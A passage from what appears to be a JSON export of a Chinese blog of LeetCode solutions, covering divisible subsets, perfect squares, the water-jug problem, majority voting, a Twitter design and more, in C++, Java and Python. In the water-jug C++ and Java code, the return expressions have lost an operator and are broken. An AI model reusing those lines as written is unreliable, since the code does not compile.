Divisible Subset 题意：给定一个数组，求其中的一个最大子集，要求该子集中任意的两个元素满足 x % y ==0 或者 y % x==0 思路：其实和求最大上升子序列LIS差不多，只不过这题要求输出序列而已。 先把数组排好序。首先要明确，若a&lt;b且b%a==0 , b &lt;c 且 c%b==0那么必然有c%a==0 我们设dp[i] 为最大的子集长度，更新的时候保存上一个的下标即可。 C++ 1234567891011121314151617181920212223242526class Solution &#123;public: vector&lt;int&gt; largestDivisibleSubset(vector&lt;int&gt;&amp; nums) &#123; vector&lt;int&gt; ans; if (nums.empty()) return ans; sort(nums.begin(), nums.end()); int n = nums.size(); vector&lt;int&gt; dp(n, 1), index(n, -1); int max_index=0, max_dp=1; for (int i = 0; i &lt; n; i++) &#123; for (int j = i - 1; j &gt;=0 ; j--) &#123; if (nums[i] % nums[j] == 0 &amp;&amp; dp[j] + 1 &gt; dp[i]) &#123; dp[i] = dp[j] + 1; index[i] = j; &#125; &#125; if (max_dp &lt; dp[i]) &#123; max_dp = dp[i]; max_index = i; &#125; &#125; for (int i = max_index; i != -1; i = index[i]) ans.push_back(nums[i]); return ans; &#125;&#125;; Java 123456789101112131415161718192021222324252627public class Solution &#123; public List&lt;Integer&gt; largestDivisibleSubset(int[] nums) &#123; List&lt;Integer&gt; ans = new ArrayList&lt;Integer&gt;(); if (nums.length == 0) return ans; Arrays.sort(nums); int n = nums.length; int[] dp = new int[n], index = new int[n]; Arrays.fill(dp, 1); Arrays.fill(index, -1); int max_index = 0, max_dp = 1; for (int i = 0; i &lt; n; i++) &#123; for (int j = i - 1 ; j &gt;= 0 ; j--) &#123; if (nums[i] % nums[j] == 0 &amp;&amp; dp[j] + 1 &gt; dp[i]) &#123; dp[i] = dp[j] + 1; index[i] = j; &#125; &#125; if (max_dp &lt; dp[i]) &#123; max_dp = dp[i]; max_index = i; &#125; &#125; for (int i = max_index; i != -1; i = index[i]) ans.add(nums[i]); return ans; &#125;&#125; Python 123456789101112131415161718192021222324252627class Solution(object): def largestDivisibleSubset(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: List[int] &quot;&quot;&quot; if not nums: return [] nums.sort() n = len(nums) dp, index = [1] * n, [-1] * n max_dp, max_index = 1, 0 for i in xrange(n): for j in xrange(i-1,-1,-1): if nums[i] % nums[j] == 0 and dp[j] + 1 &gt; dp[i]: dp[i] = dp[j] + 1 index[i] = j if max_dp &lt; dp[i]: max_dp, max_index = dp[i], i ans = [] while max_index != -1: ans.append(nums[max_index]) max_index = index[max_index] return ans 本题是leetcode 368 Largest Divisible Subset 题解 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"leetcode Valid Perfect Square","slug":"leetcode-valid-perfect-square","date":"2016-06-26T13:19:23.000Z","updated":"2021-01-08T13:32:16.885Z","comments":true,"path":"leetcode-valid-perfect-square/","link":"","permalink":"https://www.hrwhisper.me/leetcode-valid-perfect-square/","excerpt":"leetcode Valid Perfect Square Given a positive integer num, write a function which returns True if num is a perfect square else False. Note: Do not use any built-in library function such as sqrt. Example 1: 12Input: 16Returns: True Example 2: 12Input: 14Returns: False","text":"leetcode Valid Perfect Square Given a positive integer num, write a function which returns True if num is a perfect square else False. Note: Do not use any built-in library function such as sqrt. Example 1: 12Input: 16Returns: True Example 2: 12Input: 14Returns: False 题目地址：leetcode Valid Perfect Square 题意：给定一个数n，要求不使用sqrt函数判断该数是否为完全平方数 思路：二分。。 L = 1 , R = num / 2 +1开始枚举即可。。。 C++ 1234567891011121314class Solution &#123;public: bool isPerfectSquare(int num) &#123; long long L = 1, R = (num &gt;&gt; 1) + 1; while (L &lt;= R) &#123; long long m = L + ((R - L) &gt;&gt; 1); long long mul = m * m; if (mul == num) return true; else if (mul &gt; num) R = m - 1; else L = m + 1; &#125; return false; &#125;&#125;; Java 12345678910111213public class Solution &#123; public boolean isPerfectSquare(int num) &#123; long L = 1, R = (num &gt;&gt; 1) + 1; while (L &lt;= R) &#123; long m = L + ((R - L) &gt;&gt; 1); long mul = m * m; if (mul == num) return true; else if (mul &gt; num) R = m - 1; else L = m + 1; &#125; return false; &#125;&#125; Python 1234567891011121314151617class Solution(object): def isPerfectSquare(self, num): &quot;&quot;&quot; :type num: int :rtype: bool &quot;&quot;&quot; L, R = 1, (num &gt;&gt; 1) + 1 while L &lt;= R: m = L + ((R - L) &gt;&gt; 1) mul = m ** 2 if mul == num: return True elif mul &gt; num: R = m - 1 else: L = m + 1 return False 本题是leetcode 367 Valid Perfect Square题解 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"leetcode Water and Jug Problem","slug":"leetcode-water-jug-problem","date":"2016-06-24T09:42:10.000Z","updated":"2021-01-08T13:32:16.886Z","comments":true,"path":"leetcode-water-jug-problem/","link":"","permalink":"https://www.hrwhisper.me/leetcode-water-jug-problem/","excerpt":"leetcode Water and Jug Problem You are given two jugs with capacities x and y litres. There is an infinite amount of water supply available. You need to determine whether it is possible to measure exactly z litres using these two jugs. Operations allowed: Fill any of the jugs completely. Empty any of the jugs. Pour water from one jug into another till the other jug is completely full or the first jug itself is empty. Example 1: 123Input: x &#x3D; 2, y &#x3D; 6, z &#x3D; 4Output: True Example 2: 123Input: x &#x3D; 2, y &#x3D; 6, z &#x3D; 5Output: False","text":"leetcode Water and Jug Problem You are given two jugs with capacities x and y litres. There is an infinite amount of water supply available. You need to determine whether it is possible to measure exactly z litres using these two jugs. Operations allowed: Fill any of the jugs completely. Empty any of the jugs. Pour water from one jug into another till the other jug is completely full or the first jug itself is empty. Example 1: 123Input: x &#x3D; 2, y &#x3D; 6, z &#x3D; 4Output: True Example 2: 123Input: x &#x3D; 2, y &#x3D; 6, z &#x3D; 5Output: False 题目地址：leetcode Water and Jug Problem 题意: 给定两个杯子，它们分别能装x和y升水，求它们是否能恰好测量出z升的水。 思路： 题目可以表示为如下等式: mx + ny = z 若m,n&gt;0说明往里面加水，若m,n &lt;0则说明清空 如x=3，y=5 可以有 3 x + (-1)y = 4 即 m=3 , n=-1 ，也就是说我们需要往3这个杯子装满3次，5这个杯子倒掉1次 首先往3的杯子注满水，然后倒入倒入5 杯子情况为： 0，3 接着把3的杯子注满水，在倒入5 ，杯子情况为 1，5 接着把5的杯子倒掉， 把3的杯子装入5， 这样为 0，1 接着把3的杯子注满水，倒入5， 这样0，4 可以参考 ： http://www.math.tamu.edu/~dallen/hollywood/diehard/diehard.htm 本题中，若mx + ny = z 有解，则一定有z为GCD(x,y) 的整数倍，否则无解。 且需要满足条件 x + y &gt;=z C++ 12345678910class Solution &#123;public: bool canMeasureWater(int x, int y, int z) &#123; return x + y == z (x + y &gt; z ) &amp;&amp; z % gcd(x,y) == 0; &#125; int gcd(int a,int b)&#123; return b==0? a: gcd(b,a%b); &#125;&#125;; Java 123456789public class Solution &#123; public boolean canMeasureWater(int x, int y, int z) &#123; return x + y == z (x + y &gt; z ) &amp;&amp; z % gcd(x,y) == 0; &#125; private int gcd(int a,int b)&#123; return b==0? a: gcd(b,a%b); &#125;&#125; Python 12345678910111213class Solution(object): def canMeasureWater(self, x, y, z): &quot;&quot;&quot; :type x: int :type y: int :type z: int :rtype: bool &quot;&quot;&quot; def gcd(a, b): return a if b == 0 else gcd(b, a % b) return x + y == z or ((x + y &gt; z) and z % gcd(x, y) == 0) 本题是leetcode 365 Water and Jug Problem 题解 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"leetcode Max Sum of Rectangle No Larger Than K","slug":"leetcode-max-sum-rectangle-no-larger-k","date":"2016-06-22T09:08:57.000Z","updated":"2021-01-08T13:32:16.854Z","comments":true,"path":"leetcode-max-sum-rectangle-no-larger-k/","link":"","permalink":"https://www.hrwhisper.me/leetcode-max-sum-rectangle-no-larger-k/","excerpt":"leetcode Max Sum of Rectangle No Larger Than K Given a non-empty 2D matrix matrix and an integer k, find the max sum of a rectangle in the matrix such that its sum is no larger than k. Example: 12345Given matrix &#x3D; [ [1, 0, 1], [0, -2, 3]]k &#x3D; 2 The answer is 2. Because the sum of rectangle [[0, 1], [-2, 3]] is 2 and 2 is the max number no larger than k (k = 2). Note: The rectangle inside the matrix must have an area &gt; 0. What if the number of rows is much larger than the number of columns?","text":"leetcode Max Sum of Rectangle No Larger Than K Given a non-empty 2D matrix matrix and an integer k, find the max sum of a rectangle in the matrix such that its sum is no larger than k. Example: 12345Given matrix &#x3D; [ [1, 0, 1], [0, -2, 3]]k &#x3D; 2 The answer is 2. Because the sum of rectangle [[0, 1], [-2, 3]] is 2 and 2 is the max number no larger than k (k = 2). Note: The rectangle inside the matrix must have an area &gt; 0. What if the number of rows is much larger than the number of columns? 题目地址：leetcode Max Sum of Rectangle No Larger Than K 题意：给定一个矩阵，求子矩阵中的和不超过K的最大值。 思路： 朴素的思想为，枚举起始行，枚举结束行，枚举起始列，枚举终止列。。。。。O(m^2 * n^2) 这里用到一个技巧就是，进行求和时，我们可以把二维的合并成一维，然后就变为求一维的解。 比如对于矩阵： [1, 0, 1], [0, -2, 3] 进行起始行为0，终止行为1时，可以进行列的求和，即[1, -2, 4]中不超过k的最大值。 求和的问题解决完，还有一个是不超过k. 这里我参考了 https://leetcode.com/discuss/109705/java-binary-search-solution-time-complexity-min-max-log-max 的方法 使用了二分搜索。对于当前的和为sum，我们只需要找到一个最小的数x，使得 sum - k &lt;=x，这样可以保证sum - x &lt;=k。 这里需要注意，当行远大于列的时候怎么办呢？转换成列的枚举 即可。 在代码实现上，我们只需要让 m 永远小于 n即可。这样复杂度总是为O(m^2nlog n) 详见代码 C++ 12345678910111213141516171819202122232425262728class Solution &#123;public: int maxSumSubmatrix(vector&lt;vector&lt;int&gt;&gt;&amp; matrix, int k) &#123; if (matrix.empty()) return 0; int ans = INT_MIN,m = matrix.size(), n = matrix[0].size(),row_first=true; if (m &gt; n) &#123; swap(m, n); row_first = false; &#125; for (int ri = 0; ri &lt; m; ri++) &#123; vector&lt;int&gt; temp(n, 0); for (int i = ri; i &gt;= 0; i--) &#123; set&lt;int&gt; sums; int sum = 0; sums.insert(sum); for (int j = 0; j &lt; n; j++) &#123; temp[j] += row_first ? matrix[i][j]: matrix[j][i]; sum += temp[j]; auto it = sums.lower_bound(sum - k); if (it != sums.end()) ans = max(ans, sum - *it); sums.insert(sum); &#125; &#125; &#125; return ans; &#125;&#125;; 本题是leetcode 363 Max Sum of Rectangle No Larger Than K 题解 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Count Numbers with Unique Digits","slug":"leetcode-count-numbers-unique-digits","date":"2016-06-13T01:20:12.000Z","updated":"2021-01-08T13:32:16.834Z","comments":true,"path":"leetcode-count-numbers-unique-digits/","link":"","permalink":"https://www.hrwhisper.me/leetcode-count-numbers-unique-digits/","excerpt":"leetcode Count Numbers with Unique Digits Given a non-negative integer n, count all numbers with unique digits, x, where 0 ≤ x &lt; 10n. Example: Given n = 2, return 91. (The answer should be the total numbers in the range of 0 ≤ x &lt; 100, excluding [11,22,33,44,55,66,77,88,99])","text":"leetcode Count Numbers with Unique Digits Given a non-negative integer n, count all numbers with unique digits, x, where 0 ≤ x &lt; 10n. Example: Given n = 2, return 91. (The answer should be the total numbers in the range of 0 ≤ x &lt; 100, excluding [11,22,33,44,55,66,77,88,99]) 题目地址：leetcode Count Numbers with Unique Digits 题意：给定非负的整数n，求在 0 ≤ x &lt; 10n 中，有多少每个位上的数字互不相同的数？ 如 n =2 时，范围为[0,100]， 共有91个数（除了11,22,33,44,55,66,77,88,99） 思路： 排列组合题。 设i为长度为i的各个位置上数字互不相同的数。 i==1 : 1 0（0~9共10个数，均不重复） i==2: 9 * 9 （第一个位置上除0外有9种选择，第2个位置上除第一个已经选择的数，还包括数字0，也有9种选择） i ==3: 9* 9 * 8 （前面两个位置同i==2，第三个位置除前两个位置已经选择的数还有8个数可以用） …… i== n: 9 * 9 * 8 *…… (9-i+2) 需要注意的是，9- i + 2 &gt;0 即 i &lt; 11，也就是i最大为10，正好把每个数都用了一遍。 so , 其实可以算出来然后打表的，然后速度就飞快→_→ C++ 12345678910111213141516class Solution &#123;public: int countNumbersWithUniqueDigits(int n) &#123; n = min(n,10); vector&lt;int&gt; dp(n + 1, 9); dp[0] = 1; for(int i = 2;i&lt;=n;i++)&#123; for(int x = 9; x &gt;= 9 - i + 2;x--)&#123; dp[i] *= x; &#125; &#125; int ans = 0; for(int i= 0;i&lt;dp.size();i++) ans += dp[i]; return ans; &#125;&#125;; Java 123456789101112131415161718public class Solution &#123; public int countNumbersWithUniqueDigits(int n) &#123; n = Math.min(n,10); int[] dp = new int[n+1]; dp[0] = 1; for(int i = 1;i&lt;=n;i++)&#123; dp[i] = 9; for(int x = 9; x &gt;= 9 - i + 2;x--)&#123; dp[i] *= x; &#125; &#125; int ans = 0; for(int i= 0;i&lt;dp.length;i++) ans += dp[i]; return ans; &#125;&#125; Python 123456789101112class Solution(object): def countNumbersWithUniqueDigits(self, n): &quot;&quot;&quot; :type n: int :rtype: int &quot;&quot;&quot; n = min(n, 10) dp = [1] + [9] * n # 9 - n + 2 &gt; 0 =&gt; 11 &gt; n for i in xrange(2, n + 1): for x in xrange(9, 9 - i + 1, -1): dp[i] *= x return sum(dp) 本题是leetcode 357 Count Numbers with Unique Digits 题解 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"leetcode Design Twitter","slug":"leetcode-design-twitter","date":"2016-06-11T09:01:23.000Z","updated":"2021-01-08T13:32:16.837Z","comments":true,"path":"leetcode-design-twitter/","link":"","permalink":"https://www.hrwhisper.me/leetcode-design-twitter/","excerpt":"leetcode Design Twitter Design a simplified version of Twitter where users can post tweets, follow/unfollow another user and is able to see the 10 most recent tweets in the user's news feed. Your design should support the following methods: postTweet(userId, tweetId): Compose a new tweet. getNewsFeed(userId): Retrieve the 10 most recent tweet ids in the user's news feed. Each item in the news feed must be posted by users who the user followed or by the user herself. Tweets must be ordered from most recent to least recent. follow(followerId, followeeId): Follower follows a followee. unfollow(followerId, followeeId): Follower unfollows a followee. Example: 1234567891011121314151617181920212223242526Twitter twitter &#x3D; new Twitter();&#x2F;&#x2F; User 1 posts a new tweet (id &#x3D; 5).twitter.postTweet(1, 5);&#x2F;&#x2F; User 1&#39;s news feed should return a list with 1 tweet id -&gt; [5].twitter.getNewsFeed(1);&#x2F;&#x2F; User 1 follows user 2.twitter.follow(1, 2);&#x2F;&#x2F; User 2 posts a new tweet (id &#x3D; 6).twitter.postTweet(2, 6);&#x2F;&#x2F; User 1&#39;s news feed should return a list with 2 tweet ids -&gt; [6, 5].&#x2F;&#x2F; Tweet id 6 should precede tweet id 5 because it is posted after tweet id 5.twitter.getNewsFeed(1);&#x2F;&#x2F; User 1 unfollows user 2.twitter.unfollow(1, 2);&#x2F;&#x2F; User 1&#39;s news feed should return a list with 1 tweet id -&gt; [5],&#x2F;&#x2F; since user 1 is no longer following user 2.twitter.getNewsFeed(1);","text":"leetcode Design Twitter Design a simplified version of Twitter where users can post tweets, follow/unfollow another user and is able to see the 10 most recent tweets in the user's news feed. Your design should support the following methods: postTweet(userId, tweetId): Compose a new tweet. getNewsFeed(userId): Retrieve the 10 most recent tweet ids in the user's news feed. Each item in the news feed must be posted by users who the user followed or by the user herself. Tweets must be ordered from most recent to least recent. follow(followerId, followeeId): Follower follows a followee. unfollow(followerId, followeeId): Follower unfollows a followee. Example: 1234567891011121314151617181920212223242526Twitter twitter &#x3D; new Twitter();&#x2F;&#x2F; User 1 posts a new tweet (id &#x3D; 5).twitter.postTweet(1, 5);&#x2F;&#x2F; User 1&#39;s news feed should return a list with 1 tweet id -&gt; [5].twitter.getNewsFeed(1);&#x2F;&#x2F; User 1 follows user 2.twitter.follow(1, 2);&#x2F;&#x2F; User 2 posts a new tweet (id &#x3D; 6).twitter.postTweet(2, 6);&#x2F;&#x2F; User 1&#39;s news feed should return a list with 2 tweet ids -&gt; [6, 5].&#x2F;&#x2F; Tweet id 6 should precede tweet id 5 because it is posted after tweet id 5.twitter.getNewsFeed(1);&#x2F;&#x2F; User 1 unfollows user 2.twitter.unfollow(1, 2);&#x2F;&#x2F; User 1&#39;s news feed should return a list with 1 tweet id -&gt; [5],&#x2F;&#x2F; since user 1 is no longer following user 2.twitter.getNewsFeed(1); 题目地址：leetcode Design Twitter 题意：要求设计一个数据结构，使其能满足twitter的4种基本操作，发推、获得关注用户和自身最新10条推文、关注用户和取消关注。 思路：水题。和上一题一样，不明白为啥为hard。 可能难点就在于，直接写出无bug 的code吧。 需要那些非法的情况需要进行考虑吧。比如： follow操作 followerId, followeeId 相等 unfollow操作followerId 不存在，或者followerId 压根就没关注 followeeId 求10个最近的推文可以用堆（当然这里我没有） Python 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162class Twitter(object): def __init__(self): &quot;&quot;&quot; Initialize your data structure here. &quot;&quot;&quot; self.tweets_cnt = 0 self.tweets = collections.defaultdict(list) self.follower_ship = collections.defaultdict(set) def postTweet(self, userId, tweetId): &quot;&quot;&quot; Compose a new tweet. :type userId: int :type tweetId: int :rtype: void &quot;&quot;&quot; self.tweets[userId].append([tweetId, self.tweets_cnt]) self.tweets_cnt += 1 def getNewsFeed(self, userId): &quot;&quot;&quot; Retrieve the 10 most recent tweet ids in the user&#x27;s news feed. Each item in the news feed must be posted by users who the user followed or by the user herself. Tweets must be ordered from most recent to least recent. :type userId: int :rtype: List[int] &quot;&quot;&quot; recent_tweets = [] user_list = list(self.follower_ship[userId]) + [userId] userId_tweet_index = [[userId, len(self.tweets[userId]) - 1] for userId in user_list if userId in self.tweets] for _ in xrange(10): max_index = max_tweet_id = max_user_id = -1 for i, (user_id, tweet_index) in enumerate(userId_tweet_index): if tweet_index &gt;= 0: tweet_info = self.tweets[user_id][tweet_index] if tweet_info[1] &gt; max_tweet_id: max_index, max_tweet_id, max_user_id = i, tweet_info[1], user_id if max_index &lt; 0: break recent_tweets.append(self.tweets[max_user_id][userId_tweet_index[max_index][1]][0]) userId_tweet_index[max_index][1] -= 1 return recent_tweets def follow(self, followerId, followeeId): &quot;&quot;&quot; Follower follows a followee. If the operation is invalid, it should be a no-op. :type followerId: int :type followeeId: int :rtype: void &quot;&quot;&quot; if followerId != followeeId: self.follower_ship[followerId].add(followeeId) def unfollow(self, followerId, followeeId): &quot;&quot;&quot; Follower unfollows a followee. If the operation is invalid, it should be a no-op. :type followerId: int :type followeeId: int :rtype: void &quot;&quot;&quot; if followerId in self.follower_ship and followeeId in self.follower_ship[followerId]: self.follower_ship[followerId].remove(followeeId) 本题是leetcode 355 Design Twitter 题解 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"Data Structure","slug":"Data-Structure","permalink":"https://www.hrwhisper.me/tags/Data-Structure/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode 169 Majority Element || leetcode 229 Majority Element II","slug":"leetcode-169-majority-element-leetcode-229-majority-element-ii","date":"2016-06-09T01:18:39.000Z","updated":"2021-01-08T13:32:16.888Z","comments":true,"path":"leetcode-169-majority-element-leetcode-229-majority-element-ii/","link":"","permalink":"https://www.hrwhisper.me/leetcode-169-majority-element-leetcode-229-majority-element-ii/","excerpt":"leetcode 169. Majority Element Given an array of size n, find the majority element. The majority element is the element that appears more than⌊ n/2 ⌋ times. You may assume that the array is non-empty and the majority element always exist in the array.","text":"leetcode 169. Majority Element Given an array of size n, find the majority element. The majority element is the element that appears more than⌊ n/2 ⌋ times. You may assume that the array is non-empty and the majority element always exist in the array. 题目地址：leetcode 169. Majority Element 题意：给定一个长度为n的数组，求其中的主要元素即出现次数大于n/2的元素。（输入数据中，解一定存在） 思路： 1.排序，复杂度O(nlogn) 12345class Solution: # @param num, a list of integers # @return an integer def majorityElement(self, num): return sorted(num)[len(num)&gt;&gt;1] 2.hash ，时间复杂度O(n)，空间复杂度O(n) 12345678class Solution: # @param num, a list of integers # @return an integer def majorityElement(self, num): dic ,n= collections.Counter(num),len(num) for i,x in dic.items(): if x &gt; (n&gt;&gt;1): return i 摩尔投票(Boyer–Moore majority vote algorithm)，时间复杂度O(n)，空间复杂度O(1) 摩尔投票的思想是用一个计数器进行计数，当一个元素的计数为0时，替换该元素 步骤具体如下：（from wiki: Boyer–Moore majority vote algorithm） Eliminate all elements except one. Iterating through the array of numbers, maintain a current candidate and a counter initialized to 0. With the current element x in iteration, update the counter and (possibly) the candidate: If the counter is 0, set the current candidate to x and the counter to 1. If the counter is not 0, increment or decrement the counter based on whether x is the current candidate. Determine if the remaining element is a valid majority element. 翻译过来就是： 维护一个候选数candidate和计数器counter。遍历数组中所有的元素， 设当前的元素为x，若 counter = 0,则 candidate = x, counter = 1; 否则， 根据candidate 与x是否相等来更新counter（相等+1，不等-1） 在遍历一次，判断候选数是否为合法的主元素。 为什么这样做是对的呢？因为若在有解的情况下，一个元素y出现&gt;n/2次，那么要抵消掉它，必然也要有相同的元素才行，而总的元素才n个，也就是说元素y在这样的计数中不会被抵消。保证有解的情况最后的候选数就是主要元素。 代码如下：(本题中，因为一定有解，故不用进行验证候选元素是否为主元素) C 1234567891011int majorityElement(int* nums, int numsSize) &#123; int candidate=nums[0],count=1; for(int i = 1; i &lt; numsSize ;i++)&#123; if(nums[i] == candidate) count++; else if(count) count--; else&#123; count = 1; candidate = nums[i]; &#125; &#125; return candidate;&#125; Python 123456789101112131415class Solution(object): def majorityElement(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; candidate = cnt = 0 for num in nums: if candidate == num: cnt += 1 elif cnt: cnt -= 1 else: candidate, cnt = num, 1 return candidate leetcode 229. Majority Element II Given an integer array of size n, find all elements that appear more than ⌊ n/3 ⌋ times. The algorithm should run in linear time and in O(1) space. 题目地址：leetcode Majority Element II 题意：给定一个长度为n的数组，求其中出现次数大于 ⌊ n/3 ⌋ 的所有元素。 思路： 这题是上面那题的升级版，要求时间复杂度O(n)，空间复杂度O(1)，也就是不能排序、不能hash，只能用我们的摩尔投票。 首先要明确的是最多有2个解，why? 因为出现次数大于n/3，则至少有n/3+1次，若有3个解，则总数应该为 3 * （n/3+1）次，也就是 n+3 &gt;n与题目不符。 因为可能会有两个解，所以我们需要两个候选元素a和b，以及他们相应的计数cnt_a,cnt_b 初始时将a和b任意的设置为不同的数，将cnt_a和cnt_b分别设置为0，然后遍历数组。 同样的，设当前的元素为x， 若x==a 则cnt_a++ 若x==b则cnt_b ++ 若cnt_a ==0 则 a = x, cnt_a =1 若cnt_b ==0 则 b = x, cnt_b =1 否则 cnt_a-- , cnt_b-- 最后算出来的a,b在遍历一遍数组，判断其是否真的 &gt; n/3次 为什么这样是对的呢？ 对于有2个解的情况，设解为a和b, 显然a和b不会被少于n/3个元素给抵消掉，所以2个解的情况是OK的。 那么1个解的情况呢？除了元素a（a是解）外，剩下的元素不到2n/3个(这里设为m个，m &lt; 2n/3 )，而这m个元素中，至多有m/2个元素会抵消元素a（因为我们有两个计数的哇），换句话说，能抵消a的元素总数 &lt;= m/2 &lt; n /3 ,也就是说元素a最后一定会得到保留。 对于无解的情况，最后验证了是否合法，也没问题。 Python 123456789101112131415161718192021class Solution(object): def majorityElement(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: List[int] &quot;&quot;&quot; if not nums: return [] a = cnt_a = cnt_b = 0 b = 1 for num in nums: if a == num: cnt_a += 1 elif b == num: cnt_b += 1 elif not cnt_a: a, cnt_a = num, 1 elif not cnt_b: b, cnt_b = num, 1 else: cnt_a, cnt_b = cnt_a - 1, cnt_b - 1 return [n for n in (a, b) if nums.count(n) &gt; len(nums) / 3] 本题是leetcode 169 Majority Element 和 leetcode 229 Majority Element II 题解 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Russian Doll Envelopes","slug":"leetcode-russian-doll-envelopes","date":"2016-06-07T08:16:13.000Z","updated":"2021-01-08T13:32:16.866Z","comments":true,"path":"leetcode-russian-doll-envelopes/","link":"","permalink":"https://www.hrwhisper.me/leetcode-russian-doll-envelopes/","excerpt":"leetcode Russian Doll Envelopes You have a number of envelopes with widths and heights given as a pair of integers (w, h). One envelope can fit into another if and only if both the width and height of one envelope is greater than the width and height of the other envelope. What is the maximum number of envelopes can you Russian doll? (put one inside other) Example: Given envelopes = [[5,4],[6,4],[6,7],[2,3]], the maximum number of envelopes you can Russian doll is 3 ([2,3] =&gt; [5,4] =&gt; [6,7]).","text":"leetcode Russian Doll Envelopes You have a number of envelopes with widths and heights given as a pair of integers (w, h). One envelope can fit into another if and only if both the width and height of one envelope is greater than the width and height of the other envelope. What is the maximum number of envelopes can you Russian doll? (put one inside other) Example: Given envelopes = [[5,4],[6,4],[6,7],[2,3]], the maximum number of envelopes you can Russian doll is 3 ([2,3] =&gt; [5,4] =&gt; [6,7]). 传送门：leetcode Russian Doll Envelopes 题意：给定一些信封的宽和长，当且仅当信封x的宽和长均小于另一个信封y时，x可以装入y，求最多可以嵌套的装几个？ 思路: 看到就知道是求LIS了(最大上升子序列)，不明白为啥会是hard难度。 求LIS可以直接简单的dp，设dp[i]为以i为结尾的LIS长度，则dp[i] = max(0,dp[j] j&lt;i &amp;&amp; A[j] &lt; A[i]) + 1 复杂度为O(n^2)，但可以优化到O(nlogn)，排序然后二分。 本题需要注意排序的时候要注意第一项相同的情况下，第二项的顺序。 C++ 123456789101112131415161718192021bool cmp(pair&lt;int,int&gt;&amp;x, pair&lt;int, int&gt;&amp;y) &#123; return x.first != y.first ? x.first &lt; y.first : x.second &gt; y.second;&#125;class Solution &#123;public: int maxEnvelopes(vector&lt;pair&lt;int, int&gt;&gt;&amp; envelopes) &#123; int n = envelopes.size(); if (!n) return 0; sort(envelopes.begin(), envelopes.end(), cmp); vector&lt;int&gt; dp(n, 1),g(n+1, 0x7fffffff); for (int i = 0; i &lt; n; i++) &#123; int k = lower_bound(++g.begin(), g.end(), envelopes[i].second) - g.begin(); dp[i] = k; g[k] = envelopes[i].second; 